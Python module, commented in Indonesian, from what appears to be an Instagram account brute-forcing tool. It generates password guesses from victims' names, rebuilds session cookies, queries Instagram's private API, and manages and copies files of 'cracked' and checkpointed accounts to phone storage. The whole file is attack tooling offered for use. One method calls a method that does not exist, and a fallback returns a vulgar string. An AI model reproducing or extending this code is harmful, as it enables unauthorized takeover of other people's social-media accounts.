import re, requests, json, uuid, base64, hashlib, time, os
from bluid.logo import Logo

H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
N = '\x1b[0m'	 # WARNA MATI
M = "\x1b[0;31m" # Merah

class Kyanaraaa:

    def __init__(self, asw):
        self.asw = asw

    def generate_passwords(self, nama, pw_tambahan):
        nama_split = nama.split(" ")
        nama_depan = nama_split[0] if len(nama_split) > 0 else ""
        nama_belakang = nama_split[1] if len(nama_split) > 1 else ""
        pasw = []
    
        if len(nama_depan) >= 3:
            pasw += [
                nama_depan + "123",
                nama_depan + "12345",
                nama_depan + "2023",
                nama_depan + "2024",
                nama_depan + nama_depan,
        ]
    
        if len(nama_belakang) >= 3:
            pasw += [
                nama_belakang + "123",
                nama_belakang + "12345",
                nama_belakang + "2023",
                nama_belakang + "2024",
                nama_belakang + nama_belakang,
        ]

        if len(nama_depan) >= 3 and len(nama_belakang) >= 3:
            pasw += [
                nama_depan + nama_belakang,
                nama_belakang + nama_depan,
        ]
    
        pasw += pw_tambahan
        pasw = [p for p in set(pasw) if len(p) >= 6]
        return pasw[:15]
    
    def CookieBearer(self, cookie):
        try:
            abcd = json.loads(base64.b64decode(cookie).decode())
            coki = ';'.join(['%s=%s'%(x,y) for x,y in abcd.items()])
            return coki + f';dpr=2;ig_did={str(uuid.uuid4()).upper()}'
        except:
            return ''
    
    def friends_user(self, cookies):
        try:
            InfoHeaders = {'x-ig-app-locale': 'in_ID','x-ig-device-locale': 'in_ID','x-ig-mapped-locale': 'id_ID','x-bloks-version-id': '8ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb','x-bloks-is-layout-rtl': 'false','x-ig-capabilities': '3brTv10=','x-ig-app-id': '567067343352427','priority': 'u=3','user-agent': 'Instagram 275.0.0.27.98 Android (25/7.1.2; 240dpi; 720x1280; Google/google; google Pixel 2; x86; android_x86; in_ID; 458229257)','accept-language': 'id-ID, en-US','x-fb-http-engine': 'Liger','x-fb-client-ip': 'True','x-fb-server-cluster': 'True'}
            user = re.search(r'ds_user_id=(\d+)',str(cookies)).group(1)
            info = requests.get(f'https://i.instagram.com/api/v1/users/{user}/info/', headers=InfoHeaders, cookies = {'cookie':cookies}).json()['user']
            followers = info['follower_count']
            following = info['following_count']
            return followers, following
        except:
            return ('memek','memek')


    def friends_user_chek(self, username):
        try:
            head = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',}
            head.update({'Host': 'www.instagram.com','cache-control': 'max-age=0','upgrade-insecure-requests': '1','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','sec-fetch-site': 'none'})
            req = requests.get(f'https://www.instagram.com/api/v1/users/web_profile_info/?username={username}', headers=head).json()['data']['user']
            ikut,mengikut = req['edge_followed_by']['count'],req['edge_follow']['count']
            return(ikut,mengikut)
        except:return(None,None)
    

    def Android_ID(self, users, passwd):
        xyz = hashlib.md5()
        xyz.update(users.encode('utf-8') + passwd.encode('utf-8'))
        hex = xyz.hexdigest()
        xyz.update(hex.encode('utf-8') + '12345'.encode('utf-8'))
        return xyz.hexdigest()
    

    def save_hasil(self, filename, data):
        with open(filename, "a") as file:
            file.write(data + "\n")


    def tampilkan_folder(self):
        dirs = []
        try:
            if not os.path.exists("data/results"):
                exit(f"\n[{M}!{N}] Folder '{M}data/results{N}' tidak ditemukan!")

            dirs = sorted([d for d in os.listdir("data/results") if os.path.isdir(os.path.join("data/results", d))])
        except:
            exit(f"\n[{M}!{N}] Terjadi kesalahan saat membaca folder")

        if not dirs:
            exit(f"\n[{M}!{N}] Tidak ada folder tersedia di '{M}data/results{N}'")

        for i, folder in enumerate(dirs, start=1):
            print(f"[{H}{i}{N}] {folder}")
        print(f"[{M}0{N}] Kembali ke menu utama.")
        return dirs

    def tampilkan_file(self, folder):
        files = []
        try:
            files = sorted(os.listdir(os.path.join("data/results", folder)))
        except:
            exit(f"\n[{M}!{N}] Terjadi kesalahan saat membaca file di folder")

        if not files:
            exit(f"\n[{M}!{N}] Tidak ada file di folder ini")

        print("-" * 39)
        for i, file in enumerate(files, start=1):
            print(f"[{H}{i}{N}] {file}")
        print(f"[{M}0{N}] Kembali ke folder utama.")
        return files

    def cek_akun(self):
        while True:
            Logo("insta")
            print(self.asw)
            folders = self.tampilkan_folder()
            patc = input("\n[?] Pilih folder (nomor): ").strip()

            if patc in ["0", "00"]:
                return
            
            if not patc.isdigit() or int(patc) < 1 or int(patc) > len(folders):
                print(f"\n[{M}!{N}] Pilihan folder tidak valid! Coba lagi.")
                time.sleep(1)
                continue

            folder = folders[int(patc) - 1]
            while True:
                Logo("insta")
                print(self.asw)
                asu = folder.replace("OK", f"{H}OK{N}").replace("CP", f"{K}CP{N}")

                print(f"[{H}+{N}] Anda memilih folder: {asu}")
                files = self.tampilkan_file(folder)
                file_input = input("\n[?] Pilih file (nomor): ").strip()

                if file_input in ["0", "00"]:
                    break

                if not file_input.isdigit() or int(file_input) < 1 or int(file_input) > len(files):
                    print(f"\n[{H}!{N}] Pilihan file tidak valid! Coba lagi.")
                    time.sleep(1)
                    continue

                file_name = files[int(file_input) - 1]
                file_path = os.path.join("data/results", folder, file_name)
                print()
                print(f"[{H}+{N}] Membuka file: {file_name}")
                print()
                try:
                    with open(file_path, "r") as f:
                        content = f.read().strip()
                    if "CP" in file_name:
                        print(content)
                        print("---------------------------------------")
                        while True:
                            apa = input("[?] simpan hasil crack nya ke sdcard? (Y/t): ")
                            if apa in ["Y", "y"]:
                                self.simpan_ke_storage(file_path, content)
                            elif apa in ["T", "t"]:
                                input(f"[{H}+{N}] Tekan Enter untuk melanjutkan...");self.cek_akun()
                            else:
                                print(f"\n[{M}!{N}] s/c")
                                time.sleep(3)
                                continue
                    elif "OK" in file_name:
                        print(content)
                        print("---------------------------------------")
                        while True:
                            apa = input("[?] simpan hasil crack nya ke sdcard? (Y/t): ")
                            if apa in ["Y", "y"]:
                                self.simpan_ke_storage(file_path, content)
                            elif apa in ["T", "t"]:
                                input(f"[{H}+{N}] Tekan Enter untuk melanjutkan...");self.cek_akun()
                            else:
                                print(f"\n[{M}!{N}] s/c")
                                time.sleep(3)
                                continue

                except Exception as e:
                    print(f"Error membaca file: {e}")


    def get_storage_path(self):
        possible_paths = [
            "/storage/emulated/0",
            "/sdcard"
        ]
        for path in possible_paths:
            if os.path.exists(path):
                return path
        return None


    def simpan_ke_storage(self, file_name, data):
        storage_path = self.get_storage_path()
        if not storage_path:
            print(f"\n[{M}!{N}] Akses ke penyimpanan belum diizinkan. Memulai proses perizinan, silakan tekan 'Y' untuk melanjutkan.")
            time.sleep(5)
            os.system("termux-setup-storage")
            return

        remote_file = file_name.replace("data/results/CP/", "").replace("data/results/OK/", "")
        folder_name = "CP" if remote_file.startswith("CP-") else "OK"
        full_patcch = os.path.join(storage_path, "brute", "results", folder_name, remote_file)
        try:
            os.makedirs(os.path.dirname(full_patcch), exist_ok=True)
            with open(full_patcch, "a") as file:
                file.write(data + "\n")
                print(f"\n[{H}+{N}] File disimpan di: {full_patcch}")

            os.remove(file_name)
            input(f"[{H}+{N}] Tekan Enter untuk melanjutkan...");self.cek()
        except Exception as e:
            print(f"[-] Gagal menyimpan atau menghapus file: {e}")